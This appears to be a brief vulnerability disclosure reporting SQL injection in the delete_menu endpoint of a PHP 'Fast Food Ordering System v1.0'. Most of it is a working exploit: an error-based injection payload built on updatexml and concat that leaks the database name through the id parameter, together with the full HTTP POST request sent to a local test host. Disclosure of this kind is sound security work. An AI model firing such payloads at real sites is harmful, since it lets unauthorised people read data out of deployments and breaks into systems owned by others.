# Fast Food Ordering System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/classes/Master.php?f=delete_menu

Vulnerability location: /ffos/classes/Master.php?f=delete_menu, id

dbname = ffos_db

[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /ffos/classes/Master.php?f=delete_menu HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/ffos/admin/?page=menus
Content-Length: 65
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/171347303-e6b31f87-7238-4128-9b11-ddcb640230f5.png)
